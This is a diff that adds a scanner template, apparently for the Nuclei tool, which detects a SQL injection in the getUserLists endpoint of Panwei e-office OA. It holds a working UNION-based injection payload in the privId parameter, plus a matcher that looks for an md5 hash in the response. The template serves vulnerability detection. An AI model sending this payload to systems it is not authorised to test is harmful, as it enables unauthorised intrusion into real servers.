@@ -1,0 +1,25 @@
+id: e-office-getuserlists-sqli
+info:
+  name: E-Office getUserLists SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Panwei e-officeOA system is a professional collaborative OA software for small and medium-sized organizations. It is a leading brand in the domestic collaborative OA office field. It is committed to providing enterprise users with professional OA office systems, mobile OA applications, and other collaborative OA overall solutions. This template identifies a SQL injection vulnerability in the 'getUserLists' endpoint due to improper input filtering.
+  reference:
+    - https://www.e-office.cn/
+  classification:
+    cvss-score: 8.0
+http:
+  - raw:
+      - |
+        GET /E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
